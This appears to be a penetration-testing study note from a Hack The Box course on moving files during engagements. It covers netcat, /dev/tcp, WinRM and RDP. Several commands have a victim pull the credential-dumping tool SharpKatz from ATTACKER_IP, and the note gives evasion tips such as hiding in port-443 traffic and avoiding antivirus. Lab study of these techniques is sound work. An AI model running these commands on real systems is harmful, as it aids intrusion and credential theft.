
# Miscellaneous File Transfer Methods

You’ve already seen HTTP, SMB, FTP, PowerShell, and scripting-language transfers.
This section covers **last-resort and lateral-friendly techniques** that work when:

* Inbound connections are blocked
* Common tools are missing
* You already have credentials or an interactive session
* You need something *fast and reliable*

---

## Netcat & Ncat

**Netcat (`nc`)** is one of the most powerful “Swiss army knives” in networking.
It can read from and write to TCP/UDP sockets, which makes it perfect for **raw file transfers**.

The modern version, **Ncat**, is maintained by the Nmap Project and adds:

* SSL/TLS
* IPv6
* Proxy support
* Cleaner connection handling

On HTB Pwnbox, `nc`, `ncat`, and `netcat` usually point to **Ncat**.

---

## Netcat File Transfer Patterns

### Pattern 1: Target listens, attacker sends

Use this when **inbound traffic to the target is allowed**.

**Victim (listening):**

```bash
nc -l -p 8000 > SharpKatz.exe
```

**Attacker (sending):**

```bash
nc -q 0 TARGET_IP 8000 < SharpKatz.exe
```

Why `-q 0`?

* Closes the connection cleanly
* Prevents hanging sockets

With **Ncat**, use:

* `--recv-only` on the receiver
* `--send-only` on the sender

---

### Pattern 2: Attacker listens, target pulls

Use this when **inbound traffic to the target is blocked** (very common).

**Attacker (listening):**

```bash
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

**Victim (connecting):**

```bash
ncat ATTACKER_IP 443 --recv-only > SharpKatz.exe
```

Why port **443**?

* Almost always allowed outbound
* Blends into normal HTTPS traffic

---

## No Netcat? Use `/dev/tcp`

If Netcat/Ncat isn’t installed, **Bash alone** can still transfer files.

**Victim:**

```bash
cat < /dev/tcp/ATTACKER_IP/443 > SharpKatz.exe
```

This works because Bash can open TCP sockets via pseudo-device files.

✔ No binaries required
✔ Extremely stealthy
✘ Only works if Bash supports net redirections

---

## PowerShell Remoting (WinRM)

This is **not a vulnerability**—it’s **legitimate admin functionality**.

### When to use it

* You already have credentials
* You have admin or WinRM permissions
* HTTP/SMB is restricted

### Default ports

* TCP 5985 (HTTP)
* TCP 5986 (HTTPS)

---

### Create a Session

```powershell
$Session = New-PSSession -ComputerName DATABASE01
```

### Copy local → remote

```powershell
Copy-Item C:\sample.txt -ToSession $Session `
  -Destination C:\Users\Administrator\Desktop\
```

### Copy remote → local

```powershell
Copy-Item C:\Users\Administrator\Desktop\db.txt `
  -FromSession $Session -Destination C:\
```

✔ Authenticated
✔ Encrypted
✔ Logs look like normal admin activity

---

## RDP File Transfers

RDP is often **overlooked**, but it’s incredibly practical.

### Methods

1. **Clipboard copy & paste**
2. **Drive redirection**

---

### Linux → Windows via RDP (Drive Mount)

Using `xfreerdp`:

```bash
xfreerdp /v:TARGET_IP /u:administrator /p:'Password' \
/drive:linux,/home/user/files
```

On Windows, access it via:

```
\\tsclient\
```

✔ No firewall bypass needed
✔ Uses existing access
✘ AV may scan transferred files

---

## Choosing the Right Method (Mental Checklist)

Ask yourself:

1. **Do I control the connection direction?**

   * Yes → Netcat
   * No → Target pulls (Netcat, `/dev/tcp`, HTTP)

2. **Do I have credentials?**

   * Yes → WinRM or RDP
   * No → Raw socket or web-based transfer

3. **Is stealth important?**

   * Yes → WinRM, RDP, fileless pipes
   * No → Netcat for speed

4. **Is AV aggressive?**

   * Avoid shared folders
   * Prefer memory or admin channels

---

## Why This Section Matters

In real engagements and HTB labs:

* Your **first method often fails**
* Firewalls behave differently per network
* Tools disappear or are blocked

What separates beginners from professionals is **adaptability**.

> File transfer is not a tool problem — it’s a **channel problem**.

---

## Final Takeaway

If you can:

* Open a socket
* Execute a command
* Authenticate to a service

 **You can move files.**

Mastering these techniques builds:

* Muscle memory
* Creativity
* Confidence under restrictions

---
